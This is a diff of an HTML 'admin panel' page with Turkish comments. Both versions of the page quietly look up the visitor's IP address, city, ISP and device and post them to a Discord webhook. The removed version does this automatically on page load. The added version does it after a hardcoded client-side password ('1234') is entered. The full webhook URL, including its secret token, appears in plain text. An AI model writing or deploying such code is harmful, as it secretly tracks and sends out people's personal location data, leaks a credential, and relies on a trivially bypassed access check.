@@ -3,127 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEXUS ADMIN PANEL & VAULT</title>
+    <title>LEXUS ACCESS CONTROL</title>
     <style>
-        body { background-color: #000; color: #bc00ff; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .vault-container { border: 1px solid #bc00ff; padding: 20px; box-shadow: 0 0 20px rgba(188, 0, 255, 0.4); background: rgba(10, 0, 15, 0.9); width: 95%; max-width: 800px; margin-bottom: 20px; }
-        .header { border-bottom: 1px solid #bc00ff; margin-bottom: 15px; padding-bottom: 10px; font-weight: bold; letter-spacing: 2px; text-align: center; font-size: 1.5rem; }
+        body { background-color: #000; color: #bc00ff; font-family: 'Courier New', Courier, monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .vault-container { border: 1px solid #bc00ff; padding: 30px; box-shadow: 0 0 20px rgba(188, 0, 255, 0.4); background: rgba(10, 0, 15, 0.9); width: 90%; max-width: 500px; text-align: center; }
+        .header { border-bottom: 1px solid #bc00ff; margin-bottom: 20px; padding-bottom: 10px; font-weight: bold; letter-spacing: 2px; }
         
-        /* Log Listesi Alanı */
-        #log-list { max-height: 400px; overflow-y: auto; text-align: left; font-size: 12px; border: 1px dashed #444; padding: 10px; background: #050005; }
-        .log-item { border-bottom: 1px solid #222; padding: 8px 0; color: #00ff00; }
-        .log-item span { color: #ff00ff; } /* IP ve Tarih mor olsun */
-        
-        .status-bar { margin-top: 15px; font-size: 14px; color: #ff0000; text-align: center; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        
-        .controls { margin-top: 20px; }
-        .btn { border: 1px solid #ff0000; color: #ff0000; background: none; padding: 10px 20px; cursor: pointer; font-family: inherit; }
-        .btn:hover { background: #ff0000; color: #000; }
+        input { background: #000; border: 1px solid #bc00ff; color: #00ff00; padding: 10px; width: 80%; margin-bottom: 20px; outline: none; text-align: center; }
+        .btn { border: 1px solid #bc00ff; color: #bc00ff; background: none; padding: 10px 20px; cursor: pointer; font-family: inherit; transition: 0.3s; }
+        .btn:hover { background: #bc00ff; color: #000; box-shadow: 0 0 10px #bc00ff; }
+
+        #admin-panel { display: none; width: 100%; text-align: left; }
+        #log-list { max-height: 300px; overflow-y: auto; font-size: 12px; border: 1px dashed #444; padding: 10px; margin-top: 10px; color: #00ff00; }
+        .log-item { border-bottom: 1px solid #222; padding: 5px 0; }
+        .error { color: #ff0000; font-size: 12px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="vault-container">
-        <div class="header">[ LEXUS_DATABASE_VAULT_V12 ]</div>
+    <div id="login-screen" class="vault-container">
+        <div class="header">[ ACCESS_REQUIRED ]</div>
+        <p style="font-size: 13px;">Sisteme erişmek için yetkili şifresini girin.</p>
+        <div id="error-msg" class="error"></div>
+        <input type="password" id="pass-input" placeholder="********">
+        <br>
+        <button class="btn" onclick="checkAccess()">SİSTEME GİRİŞ YAP</button>
+    </div>
+
+    <div id="admin-panel" class="vault-container">
+        <div class="header">[ LEXUS_ADMIN_DASHBOARD ]</div>
+        <div id="welcome-msg" style="font-size: 14px; color: #00ff00;"></div>
         
         <div id="log-list">
-            <div class="log-item">Sistem başlatıldı... Kayıtlar bekleniyor...</div>
-        </div>
+            </div>
 
-        <div class="status-bar">
-            DURUM: TARAMA MODU AKTİF <span class="blink">_</span>
-        </div>
-
-        <div class="controls">
-            <button class="btn" onclick="clearLogs()">LOGLARI SIFIRLA</button>
-        </div>
+        <button class="btn" style="margin-top: 20px; border-color: red; color: red;" onclick="clearLogs()">LOGLARI SIFIRLA</button>
     </div>
 
     <script>
+        const API_KEY = "1234"; // BURAYI İSTEDİĞİN ŞİFRE YAP
         const webhookURL = "https://discord.com/api/webhooks/1480291700793544774/a8WwCE5IsjTE-p5kwWHuuI9IUGHLYYM1yAYtvz10nbhEljg2abosvDz3y74xzVnBT4eN";
 
-        // Sayfa yüklendiğinde eski logları getir
-        window.onload = () => {
-            displayLogs();
-            collectAndSend();
-        };
+        async function checkAccess() {
+            const input = document.getElementById('pass-input').value;
+            const errorMsg = document.getElementById('error-msg');
 
-        async function collectAndSend() {
-            try {
-                // Bilgileri Topla
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const data = await ipRes.json();
+            if (input === API_KEY) {
+                // Şifre Doğru
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('admin-panel').style.display = 'block';
                 
-                const logEntry = {
-                    ip: data.ip,
-                    city: data.city,
-                    isp: data.org,
+                // Bilgileri topla ve gönder
+                const data = await collectData();
+                if(data) {
+                    saveAndDisplay(data);
+                    sendToDiscord(data);
+                }
+            } else {
+                errorMsg.innerText = "!! YETKİSİZ ERİŞİM DENEMESİ !!";
+                document.getElementById('pass-input').value = "";
+            }
+        }
+
+        async function collectData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const info = await res.json();
+                return {
+                    ip: info.ip,
+                    city: info.city,
+                    isp: info.org,
                     device: navigator.platform,
-                    date: new Date().toLocaleString()
+                    time: new Date().toLocaleString()
                 };
-
-                // 1. Webhook'a Gönder
-                sendToDiscord(data, logEntry);
-
-                // 2. Admin Paneline (Local Storage) Kaydet
-                saveLog(logEntry);
-
-            } catch (err) {
-                console.error("Hata:", err);
-            }
+            } catch (e) { return null; }
         }
 
-        function saveLog(entry) {
-            let logs = JSON.parse(localStorage.getItem('lexus_logs')) || [];
-            logs.unshift(entry); // Yeni logu başa ekle
-            localStorage.setItem('lexus_logs', JSON.stringify(logs));
-            displayLogs();
-        }
-
-        function displayLogs() {
-            const logList = document.getElementById('log-list');
-            let logs = JSON.parse(localStorage.getItem('lexus_logs')) || [];
+        function saveAndDisplay(entry) {
+            let logs = JSON.parse(localStorage.getItem('lexus_secure_logs')) || [];
+            logs.unshift(entry);
+            localStorage.setItem('lexus_secure_logs', JSON.stringify(logs));
             
-            if (logs.length > 0) {
-                logList.innerHTML = logs.map(l => `
-                    <div class="log-item">
-                        [${l.date}] <span>GİRİŞ TESPİT EDİLDİ:</span> ${l.ip} - ${l.city} (${l.isp}) - 📱 ${l.device}
-                    </div>
-                `).join('');
-            }
+            const list = document.getElementById('log-list');
+            list.innerHTML = logs.map(l => `
+                <div class="log-item">
+                    [${l.time}] <span style="color:#bc00ff">${l.ip}</span> - ${l.city} (${l.isp})
+                </div>
+            `).join('');
+            
+            document.getElementById('welcome-msg').innerText = "HOŞ GELDİN: " + entry.ip;
         }
 
-        function clearLogs() {
-            if(confirm("Tüm kayıtlar silinsin mi?")) {
-                localStorage.removeItem('lexus_logs');
-                location.reload();
-            }
-        }
-
-        async function sendToDiscord(info, entry) {
+        async function sendToDiscord(l) {
             const payload = {
-                username: "LEXUS ADMIN NOTIFIER",
+                username: "LEXUS SECURITY",
                 embeds: [{
-                    title: "⚠️ PANEL GİRİŞİ!",
-                    color: 12320255,
+                    title: "🔓 PANEL ERİŞİLDİ (ŞİFRE GEÇİLDİ)",
+                    color: 3066993, // Yeşil
                     fields: [
-                        { name: "🌐 IP", value: info.ip, inline: true },
-                        { name: "📍 Konum", value: `${info.city}/${info.country_name}`, inline: true },
-                        { name: "🔌 Sağlayıcı", value: info.org, inline: false },
-                        { name: "📱 Sistem", value: navigator.userAgent, inline: false }
+                        { name: "🌐 IP", value: l.ip, inline: true },
+                        { name: "📍 Konum", value: l.city, inline: true },
+                        { name: "🔌 ISP", value: l.isp, inline: false },
+                        { name: "📱 Cihaz", value: l.device, inline: true }
                     ],
+                    footer: { text: "Lexus Access Control System" },
                     timestamp: new Date()
                 }]
             };
-
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+            await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
         }
+
+        function clearLogs() {
+            localStorage.removeItem('lexus_secure_logs');
+            location.reload();
+        }
+
+        // Sayfa yenilendiğinde eğer log varsa listele (ama şifre ekranı yine gelir)
+        window.onload = () => {
+            const logs = JSON.parse(localStorage.getItem('lexus_secure_logs'));
+            if(logs) {
+                const list = document.getElementById('log-list');
+                list.innerHTML = logs.map(l => `<div class="log-item">[${l.time}] ${l.ip}</div>`).join('');
+            }
+        };
     </script>
 </body>
 </html>
